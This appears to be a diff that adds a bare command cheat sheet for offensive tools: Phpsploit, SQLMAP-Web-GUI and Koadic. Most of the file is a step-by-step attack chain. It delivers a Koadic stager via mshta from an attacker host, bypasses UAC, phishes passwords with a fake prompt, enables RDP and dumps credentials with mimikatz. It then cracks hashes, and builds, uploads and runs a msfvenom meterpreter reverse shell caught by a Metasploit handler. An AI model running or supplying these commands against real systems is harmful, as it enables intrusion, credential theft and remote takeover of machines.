@@ -1,0 +1,63 @@
+Phpsploit 
+set target 192.168.1.3
+exploit
+set target http://192.168.1.3/script/script.php
+whoami
+pwd
+run ipconfig
+run systeminfo
+ 
+SQLMAP-Web-GUI 
+git clone https://github.com/Hood3dRob1n/SQLMAP-Web-GUI
+cd SQLMAP-Web-GUI
+mv sqlmap ..
+cd ..
+chmod 777 sqlmap
+python usr/share/sqlmapapi.py -s
+
+Koadic
+git clone https://github.com/zerosum0x0/koadic.git
+cd koadic
+apt-get install python3-pip
+pip3 install -r requirements.txt
+./koadic
+
+use stager/js/
+set SRVHOST 192.168.1.107
+set ENDPOINT sales
+run
+mshta http://192.168.1.107:9999/sales
+zombies 0
+use implant/elevate/bypassuac_eventvwr
+set PAYLOAD 0
+set ZOMBIE 0
+run
+use implant/phish/password_box
+set ZOMBIE 1
+run
+use implant/mange/enable_rdesktop
+set ZOMBIE 1
+run
+nmap -p3389 192.168.1.103
+use implant/inject/mimikatz_dotnet2js
+set ZOMBIE 1
+run
+john hash --format=NT
+use implant/manage/exec-cmd
+set CMD ipconfig
+set ZOMBIE 1
+run
+msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.1.107 lport=1234 -f exe > shell.exe
+use implant/util/upload_file
+set LFILE /root/shell.exe
+set ZOMBIE 1
+run
+use implant/manage/exec-cmd
+set CMD %TEMP%shell.exe
+set ZOMBIE 1
+run
+msf > use exploit/multi/handler
+msf exploit(handler) > set payload windows/meterpreter/reverse_tcp
+msf exploit(handler) > set rhost IP 192.168.1.107
+msf exploit(handler) > set lport 1234
+msf exploit(handler) > exploit
